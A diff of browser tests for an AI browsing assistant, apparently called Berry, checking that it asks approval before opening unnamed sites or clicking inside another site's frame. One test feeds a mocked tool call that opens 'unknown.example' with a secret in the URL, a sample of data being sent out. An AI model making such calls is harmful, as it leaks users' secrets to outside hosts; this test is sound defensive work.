@@ -413,6 +413,9 @@ test("real input in a tab behind the chat, a card naming another site's frame, a
   await message.fill("Press them");
   await message.press("Enter");
 
+  // A site the user didn't name asks before it's opened.
+  await expect(card.locator("p").getByText(`Open ${url} in a new tab`)).toBeVisible();
+  await card.getByRole("button", { name: "Allow" }).click();
   // Even a harmless-looking button in another site's frame asks, and says whose it is.
   await expect(card.locator("p").getByText(`Click the button “Inside” in a frame from ${framed}, inside ${url}`)).toBeVisible();
   await card.getByRole("button", { name: "Allow" }).click();
@@ -773,7 +776,9 @@ test("by default Berry acts without asking unless it's risky, and Settings can t
   await expect(card).toBeVisible();
   await card.getByRole("button", { name: "Cancel" }).click();
   await expect(replies()).toHaveCount(++done);
-  await act("open_tab", { url: "https://unknown.example/?secret=abc" });
+  // Not in the message, since an address the user typed doesn't ask.
+  model.callTools({ name: "open_tab", args: { url: "https://unknown.example/?secret=abc" } });
+  await askInPanel("Open it");
   await expect(card).toBeVisible();
   await card.getByRole("button", { name: "Cancel" }).click();
   await expect(replies()).toHaveCount(++done);
